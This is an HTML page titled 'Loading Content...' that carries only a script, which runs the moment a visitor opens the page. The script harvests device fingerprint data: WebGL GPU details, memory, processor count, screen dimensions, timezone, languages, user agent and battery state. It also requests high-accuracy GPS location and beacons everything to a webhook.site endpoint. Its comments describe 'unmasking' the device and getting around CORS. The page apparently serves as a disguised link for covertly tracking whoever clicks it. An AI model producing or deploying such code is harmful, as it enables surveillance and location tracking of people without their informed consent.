<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Content...</title>
</head>
<body>
    <script>
        // Your designated Webhook.site target destination URL
        const TARGET_HOOK = "https://webhook.site";

        async function executeBeaconTelemetryHarvest() {
            // Get WebGL graphics card data to unmask exact device processor/chipset
            let gpuVendor = "Unknown";
            let gpuRenderer = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) { }

            // Base advanced data log structure
            let payload = {
                timestamp: new Date().toISOString(),
                
                // 1. HARDWARE SPECIFICATIONS & SIGNATURES
                hardware_metrics: {
                    device_memory_gb: navigator.deviceMemory || "Restricted/iOS",
                    logical_processors: navigator.hardwareConcurrency || "Restricted/iOS",
                    system_platform: navigator.platform,
                    max_touch_points: navigator.maxTouchPoints,
                    cookies_enabled: navigator.cookieEnabled
                },

                // 2. CHIPSET & GPU UNMASKING
                graphics_chipset: {
                    vendor: gpuVendor,
                    renderer: gpuRenderer
                },
                
                // 3. CANVAS SCREEN SIGNATURES (Isolates precise device model form factors)
                display_dimensions: {
                    viewport_width: window.innerWidth,
                    viewport_height: window.innerHeight,
                    screen_width: window.screen.width,
                    screen_height: window.screen.height,
                    device_pixel_ratio: window.devicePixelRatio,
                    color_depth: window.screen.colorDepth
                },
                
                // 4. REGIONAL & ENVIRONMENT SETTINGS
                environment_settings: {
                    detected_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    configured_languages: navigator.languages,
                    user_agent_raw: navigator.userAgent
                }
            };

            // 5. BATTERY STATUS TRACKING
            if (navigator.getBattery) {
                try {
                    const batteryInfo = await navigator.getBattery();
                    payload.battery_status = {
                        charge_percentage: (batteryInfo.level * 100) + "%",
                        power_connected: batteryInfo.charging
                    };
                } catch (e) { }
            }

            // 6. GEOLOCATION POSITION (Runs asynchronously)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        payload.gps_telemetry = {
                            status: "Permission Granted",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            precision_radius_meters: position.coords.accuracy
                        };
                        transmitViaBeacon(payload);
                    },
                    (error) => {
                        payload.gps_telemetry = {
                            status: "Permission Denied",
                            error_message: error.message
                        };
                        transmitViaBeacon(payload);
                    },
                    { enableHighAccuracy: true, timeout: 4000 }
                );
            } else {
                payload.gps_telemetry = { status: "Unsupported" };
                transmitViaBeacon(payload);
            }
        }

        function transmitViaBeacon(data) {
            // Converts the JSON object to a string blob
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            
            // Fires a direct, background beacon that completely ignores browser CORS rules
            navigator.sendBeacon(TARGET_HOOK, blob);
            console.log("Telemetry transmitted via browser beacon pipeline.");
        }

        // Initialize immediately upon browser rendering lifecycle
        window.onload = executeBeaconTelemetryHarvest;
    </script>
</body>
</html>
